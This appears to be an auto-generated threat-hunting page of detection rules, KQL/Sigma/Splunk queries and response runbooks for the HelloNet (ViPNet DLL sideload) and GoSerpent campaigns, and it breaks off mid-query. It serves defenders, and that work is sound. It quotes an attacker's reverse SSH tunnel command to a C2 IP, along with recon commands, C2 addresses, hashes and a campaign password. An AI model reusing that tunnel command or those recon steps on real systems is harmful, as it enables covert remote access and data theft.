Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Article-specific behavioural hunt — HelloNet campaign — new malicious modules launched through the ViPNet update sys
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] HelloNet persistence: wtsapi32.dll sideload dropped into ViPNet Update System dir · [LLM] HelloInjector sideload execution: itcsrvup64.exe loads wtsapi32.dll from non-System32 path · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] HelloProxy AFD interception artifact: tesh4RPC.txt log written to C:\Users\Public · [LLM] HelloNet C2 egress to 5.39.253.206 / 176.32.34.135 · [LLM] Renamed PuTTY reverse SSH tunnel to HelloNet C2 (frontpage.exe -R sftp@5.39.253.206) · [LLM] Injected svchost (netsvcs) listener on HelloProxy ports 5003/5060 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains

HelloNet persistence: wtsapi32.dll sideload dropped into ViPNet Update System dir AIInstallation High
Hunts the HelloInjector persistence artifact: a wtsapi32.dll planted in C:\Program Files (x86)\InfoTeCS\VIPNet Update System so the auto-started itcsrvup64.exe sideloads it. The legitimate wtsapi32.dll ships only in System32/SysWOW64, so any copy in the ViPNet update directory is malicious. Rationale: Anchored on the exact malicious path (C:\Program Files (x86)\InfoTeCS\VIPNet Update System) and filename (wtsapi32.dll) named in the article. wtsapi32.dll is a genuine System32 DLL, so its presence in the ViPNet update folder is a near-zero-FP sideload indicator. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://securelist.com/new-backdoor-mimics-security-software-update/116246/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1574.002 T1036.005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • InfoTeCS vendor pushing an updated ViPNet build that legitimately relocates a DLL (verify Authenticode signer = InfoTeCS)
  • Backup/restore or file-recovery tooling replaying an old snapshot into the folder
  • Security analyst copying the sample into the directory during IR reproduction
  • AV quarantine-then-restore cycle re-writing the file
Suppression filter
| where InitiatingProcessVersionInfoCompanyName != "OOO Infotecs" or isempty(InitiatingProcessVersionInfoCompanyName)
Response runbook
1) Triage: pull the SHA256 of the dropped wtsapi32.dll and check Authenticode signer — a valid InfoTeCS signature is benign; unsigned/self-signed = malicious. Compare hash to the article MD5s (e.g. 16c211c96735f2fae9361b89bd7a31bf). 2) Contain: isolate the host, kill itcsrvup64.exe, and quarantine the DLL before next reboot (it auto-loads at OS start). 3) Hunt: search the estate for the same file/path, then pivot to the injected svchost (netsvcs), tesh4RPC.txt log, and outbound to 5.39.253.206.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "wtsapi32.dll"
| where FolderPath has @"\InfoTeCS\VIPNet Update System"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "wtsapi32.dll"
| where TargetFilePath has @"\InfoTeCS\VIPNet Update System"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername, Hash
| order by TimeGenerated desc

HelloInjector sideload execution: itcsrvup64.exe loads wtsapi32.dll from non-System32 path AIInstallation High
Detects the moment itcsrvup64.exe image-loads the malicious wtsapi32.dll from the ViPNet directory instead of the OS System32 copy — the execution half of the side-load that leads to svchost injection. Complements the file-drop rule by catching cases where the DLL was staged before telemetry was on. Rationale: Uses the specific loader (itcsrvup64.exe) and DLL (wtsapi32.dll) plus a System32/SysWOW64 path exclusion so only the article's malicious load path fires. Sentinel/Splunk/Falcon left empty: image-load telemetry has no clean CIM datamodel, ASIM table, or listed FDR event; expressed via Defender + Sysmon EID 7 (Sigma) only. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1574.002
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Genuine ViPNet build that legitimately bundles a private wtsapi32.dll next to itcsrvup64.exe (verify signer)
  • Application-virtualization/App-V layering that redirects System DLL loads to a package path
  • Analyst detonating the sample in a sandbox
Response runbook
1) Triage: hash the loaded wtsapi32.dll (SHA256) and confirm signer; correlate with any DeviceFileEvents drop from rule #1. 2) Contain: isolate host, terminate itcsrvup64.exe and the child svchost it injected. 3) Hunt: dump svchost.exe (netsvcs) memory for the plaintext payload, and check for C:\users\public\tesh4RPC.txt and listeners on 5003/5060.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "itcsrvup64.exe"
| where FileName =~ "wtsapi32.dll"
| where not(FolderPath startswith @"C:\Windows\System32") and not(FolderPath startswith @"C:\Windows\SysWOW64")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc

| where not(FolderPath startswith @"C:\Windows\System32") and not(FolderPath startswith @"C:\Windows\SysWOW64")
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by TimeGenerated desc

HelloProxy AFD interception artifact: tesh4RPC.txt log written to C:\Users\Public AICommand & Control High
Hunts the operational log file HelloProxy writes for every connection its AFD_RECV hook processes (C:\users\public\tesh4RPC.txt, 'threadid: <tid> pid=<pid>'). The filename is unique to this implant, making the file-write a very high-fidelity indicator of an active in-memory proxy. Rationale: tesh4RPC.txt in C:\users\public is a verbatim, implant-unique artifact from the article (HelloProxy's AFD_RECV handler log). No legitimate software writes this name, so a single hit is high-confidence C2 activity. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1005
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst copying the IOC file into Public during reproduction
  • Threat-intel sync tool staging IOC samples in a shared folder
  • Backup restore of a previously infected profile
Response runbook
1) Triage: identify the writing process (InitiatingProcessFileName) — it should resolve to an injected svchost.exe; read the file to confirm the 'threadid: <tid> pid=<pid>' format. 2) Contain: isolate host, capture a full memory image of the svchost PID before killing it (payload is in-memory only), then quarantine. 3) Hunt: check listeners on ports 5003/5060, outbound to 5.39.253.206 / 176.32.34.135, and frontpage.exe SSH tunnels.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "tesh4RPC.txt"
| where FolderPath has @"\Users\Public"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessFolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "tesh4RPC.txt"
| where TargetFilePath has @"\Users\Public"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActorUsername
| order by TimeGenerated desc

HelloNet C2 egress to 5.39.253.206 / 176.32.34.135 AICommand & Control Medium
Detects any host communicating with the two HelloNet command-server IPs, including the SSH tunnel endpoint 5.39.253.206:3522 used to relay proxied traffic back to the attackers. Straight IOC-match network detection across endpoint and NDR telemetry. Rationale: Both IPs (5.39.253.206, 176.32.34.135) are pre-extracted IOCs corroborated by the Securelist report and independent write-ups as HelloNet C2; 5.39.253.206:3522 is the confirmed SSH tunnel endpoint. Direct IOC match = high confidence. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://www.kaspersky.ru/about/press-releases/novyj-bekdor-atakoval-desyatki-rossijskih-organizacij
ATT&CKT1571 T1090
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel/sandbox infrastructure deliberately connecting to the IOC IPs for research
  • Shared hosting reuse — if the VPS is later re-leased to a benign tenant (validate timestamp against campaign window May-Jul 2026)
  • Security scanner probing the IPs from a jump host
Response runbook
1) Triage: identify the initiating process — svchost.exe (injected) or frontpage.exe (renamed PuTTY) confirms HelloNet; a browser suggests unrelated/scanner traffic. 2) Contain: block both IPs at the perimeter, isolate the host, kill the tunnel process. 3) Hunt: pivot on the host for wtsapi32.dll sideload, tesh4RPC.txt, and listeners on 5003/5060; sweep proxy logs for other internal hosts talking to these IPs.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("5.39.253.206", "176.32.34.135")
| project Timestamp, DeviceName, RemoteIP, RemotePort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr in ("5.39.253.206", "176.32.34.135")
| project TimeGenerated, SrcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, NetworkProtocol, DvcAction
| order by TimeGenerated desc

Renamed PuTTY reverse SSH tunnel to HelloNet C2 (frontpage.exe -R sftp@5.39.253.206) AICommand & Control High
Detects the HelloNet reverse-tunnel launch: a renamed PuTTY (frontpage.exe in C:\users\public\music) opening an SSH reverse tunnel (-R 8443:...:5003) to sftp@5.39.253.206 on port 3522. Anchored on the C2 user@host string and the -R reverse-forward flag so it catches the behaviour even if the binary is renamed again. Rationale: Verbatim from the article: 'C:\users\public\music\frontpage.exe -C -N -R 8443:[redacted]:5003 sftp@5.39.253.206 -P 3522'. The user@C2 string plus the -R reverse-forward flag is behaviourally unique; the frontpage.exe-in-Public\Music clause catches the masqueraded binary independently. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/ • https://cyberpress.org/new-malware-masquerades-as-networking-software-updates/
ATT&CKT1572 T1090 T1036.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A sysadmin legitimately named their own PuTTY 'frontpage.exe' (rare; validate the destination is not 5.39.253.206)
  • IT staff running authorised reverse tunnels to a jump host (destination will differ from the C2)
  • Analyst reproducing the command line in a lab
Response runbook
1) Triage: confirm destination = 5.39.253.206:3522 and forwarded local port 5003 (ties to HelloProxy listener). Recover the -pw argument for the attacker credential. 2) Contain: kill the process, block 5.39.253.206, isolate host, and rotate any exposed jump-host/service creds. 3) Hunt: enumerate all C:\Users\Public\Music binaries estate-wide and correlate with wtsapi32.dll sideload hosts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (ProcessCommandLine has "sftp@5.39.253.206" and ProcessCommandLine has "-R ")
   or (FolderPath has @"\Users\Public\Music" and FileName =~ "frontpage.exe")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where (CommandLine has "sftp@5.39.253.206" and CommandLine has "-R ") or (NewProcessName endswith @"\Users\Public\Music\frontpage.exe")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Injected svchost (netsvcs) listener on HelloProxy ports 5003/5060 AICommand & Control Medium
Detects the HelloProxy control channel: an svchost.exe process opening listening sockets on TCP 5003 and 5060 to await C2 commands after the 0x0502/ASDFASFSAFASDF handshake. A netsvcs svchost creating inbound listeners on these ports is not normal Windows service behaviour. Rationale: Ports 5003 and 5060, initiated by svchost, are the exact HelloProxy listen ports named in the article. svchost.exe (netsvcs) legitimately listens on RPC/known service ports, never on 5003/5060, so this is a clean anomaly. Kept Defender-only: ListeningConnectionCreated has no equivalent in the listed CIM, ASIM, FDR, or Sysmon event schemas. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1090 T1571
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate third-party service hosted under svchost that happens to bind 5060 (SIP) — validate the parent is services.exe and check for the co-occurring wtsapi32.dll sideload
  • Enterprise SIP/VoIP softphone service registered as an svchost-hosted service
  • Port-reuse after a benign service released 5003
Response runbook
1) Triage: confirm the svchost PID matches an injected process (cross-ref rule #2 image-load and tesh4RPC.txt writer). 2) Contain: capture memory of the svchost PID, then isolate and kill; block the ports at host firewall. 3) Hunt: look for inbound sessions to 5003/5060 and the outbound tunnel forwarding local:5003 to 5.39.253.206.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project Timestamp, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceNetworkEvents
| where TimeGenerated > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project TimeGenerated, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by TimeGenerated desc
HelloExecutor recon: injected svchost enumerating ViPNet/InfoTeCS export directories AIActions on Objectives High
Detects HelloExecutor reconnaissance where the injected svchost.exe (netsvcs) shells out to enumerate InfoTeCS/ViPNet Administrator key-container Export directories (kc\Export). svchost spawning shell commands that reference infotecs+ViPNet is highly abnormal and specific to this campaign's key-material hunting. Rationale: The article lists explicit recon commands enumerating 'C:\Program Files (x86)\infotecs\ViPNet Administrator', 'ViPNet Client\Export', and 'ViPNet Administrator\kc\Export' — the attackers are hunting ViPNet key material. Requiring an svchost(netsvcs) parent plus infotecs+ViPNet in the child command line makes this campaign-specific rather than a generic 'dir' hunt. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1083 T1057 T1552.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A ViPNet administrator legitimately scripting an inventory of Export directories (parent will be cmd/powershell/explorer, not svchost)
  • Backup software indexing InfoTeCS folders (not spawned by svchost netsvcs)
  • Endpoint asset-management agent scanning Program Files
Suppression filter
| where InitiatingProcessParentFileName =~ "services.exe"
Response runbook
1) Triage: confirm the parent svchost is the injected instance (cross-ref wtsapi32.dll sideload / tesh4RPC.txt on the same host); the netsvcs svchost should never spawn cmd/net/dir. 2) Contain: isolate host, capture svchost memory, and treat any ViPNet key material in kc\Export as compromised — flag for certificate/key reissue. 3) Hunt: pull the full recon command set (query user, ipconfig /all, net user /do, net group /do) from the same PID and check for HelloCleaner log-wiping and outbound to 5.39.253.206.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "svchost.exe" and InitiatingProcessCommandLine has "netsvcs"
| where ProcessCommandLine has "infotecs" and ProcessCommandLine has "ViPNet"
| where ProcessCommandLine has_any ("ViPNet Administrator", "kc\\Export", "ViPNet Client\\Export")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith @"\svchost.exe"
| where CommandLine has "infotecs" and CommandLine has "ViPNet"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: HelloExecutor svchost Recon of ViPNet Export Directories
id: 6e0f3a27-9c15-4b82-a4d6-7f1b8e2c9053
status: experimental
description: Injected svchost enumerating InfoTeCS/ViPNet key-container export directories (HelloExecutor reconnaissance)
references:
  - https://securelist.com/tr/hellonet-vipnet/120700/
author: SOC Detection Engineering
date: 2026/07/16
tags:
  - attack.discovery
  - attack.t1083
  - attack.credential_access
  - attack.t1552.004
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\svchost.exe'
    ParentCommandLine|contains: 'netsvcs'
  keywords:
    CommandLine|contains|all:
      - 'infotecs'
      - 'ViPNet'
  condition: selection and keywords
level: high
source:windows.sysmon @EventID:1 (@ParentImage:*\\svchost.exe OR @ParentImage:*\\SVCHOST.EXE) (@CommandLine:*infotecs* OR @CommandLine:*Infotecs* OR @CommandLine:*INFOTECS*) (@CommandLine:*ViPNet* OR @CommandLine:*vipnet* OR @CommandLine:*VIPNET*)
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/svchost\.exe$/i
| CommandLine=/infotecs/i
| CommandLine=/vipnet/i
| groupBy([aid, ComputerName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name="svchost.exe" AND Processes.parent_process="*netsvcs*" AND Processes.process="*infotecs*" AND Processes.process="*ViPNet*" by Processes.dest Processes.user Processes.parent_process Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name="svchost.exe" AND Processes.parent_process="*netsvcs*" AND Processes.process="*infotecs*" AND Processes.process="*ViPNet*" by Processes.dest Processes.user Processes.parent_process Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Remote service execution — PsExec / SMB lateral movement Actions on Objectives High

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Article-specific behavioural hunt — HelloNet campaign — new malicious modules launched through the ViPNet update sys Exploitation High
Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.
ATT&CKT1543.003
Data sourcesEndpoint.Processes Endpoint.Filesystem Endpoint.Registry
// Article-specific bespoke detection — HelloNet campaign — new malicious modules launched through the ViPNet update sys
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName in~ ("wtsapi32.dll", "itcsrvup64.exe", "frontpage.exe", "itcsrvup.exe", "puh.exe", "store.exe", "amgmt.dll", "selfname.dll", "amgmt.bat", "insru.cmd", "7z.exe", "autoit3.exe", "pagent.exe") or FolderPath has_any ("C:\users\public\tesh4RPC.txt", "\ProgramData\Infotecs\ViPNet", "C:\Users\Public\music", "C:\users\public\music\frontpage.exe"))
| project Timestamp, DeviceName, AccountName, FileName,
          FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

// File-creation events for the named binaries / paths
DeviceFileEvents

Two-phase attacks with the GoSerpent backdoor, Stowaway RAT, ThumbcacheService and other tools aim to steal data from government entities in Southeast Asia.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Article-specific behavioural hunt — GoSerpent: a persistent threat evolves with sophisticated data collection and ex
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] GoSerpent/McMx masquerading proxy binaries lass.exe and updates.exe · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] GoSerpent ThumbcacheService staging DB (thumbcache_605a.db) written to C:\Users\Public · [LLM] GoSerpent 7-Zip archiving with hardcoded campaign password @vx0a9n5W2M0c3D6.# · [LLM] GoSerpent QuarksDumpLocalHash / SAM hive local hash extraction · LSASS process access / dump (credential theft)
GoSerpent ThumbcacheService staging DB (thumbcache_605a.db) written to C:\Users\Public AIActions on Objectives High
Hunts creation of the ThumbcacheService collection database thumbcache_605a.db in C:\Users\Public\, where GoSerpent stages harvested .doc/.docx/.pdf/.xls/.xlsx documents before exfiltration. Legitimate Windows thumbnail caches use the same thumbcache_*.db naming but live under AppData\Local\Microsoft\Windows\Explorer, never in the Public profile, making the Public-path variant article-specific. Rationale: Anchored on the article's verbatim filename thumbcache_605a.db (code block) and the C:\Users\Public\ staging path; legitimate thumbcache DBs never live in the Public profile, so the path variant catches renamed samples with near-zero FP. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1074.001 T1119
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A user or admin manually copying their AppData thumbnail cache into C:\Users\Public for troubleshooting
  • Backup/migration tooling that mirrors user profile Explorer caches into a shared Public folder
  • Forensic/IR tools exporting thumbcache artifacts to C:\Users\Public for analysis
  • A security researcher detonating the sample in a lab on a monitored host
Suppression filter
| where InitiatingProcessFolderPath !has @"\Windows\explorer.exe"
Response runbook
1) Triage: identify InitiatingProcessFileName that wrote the DB; a service DLL host (svchost.exe hosting an unknown service) or a binary in Public/Temp is high-suspicion. Inspect the file for a 7-Zip archive nearby and confirm it is not a genuine Explorer cache. 2) Contain: isolate the host, capture the DB and any adjacent .7z archives for analysis, and disable/stop the suspicious Windows service backing ThumbcacheService. 3) Hunt: pivot on the same host for 7-Zip archiving with the campaign password, lass.exe/updates.exe processes, and SAM/LSASS credential-dumping activity in the prior days.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "thumbcache_605a.db"
    or (FolderPath has @"\Users\Public\" and FileName startswith "thumbcache_" and FileName endswith ".db")
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "thumbcache_605a.db"
    or (TargetFilePath has @"\Users\Public\" and TargetFileName startswith "thumbcache_" and TargetFileName endswith ".db")
| project TimeGenerated, DvcHostname, TargetFileName, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

GoSerpent 7-Zip archiving with hardcoded campaign password @vx0a9n5W2M0c3D6.# AIActions on Objectives High
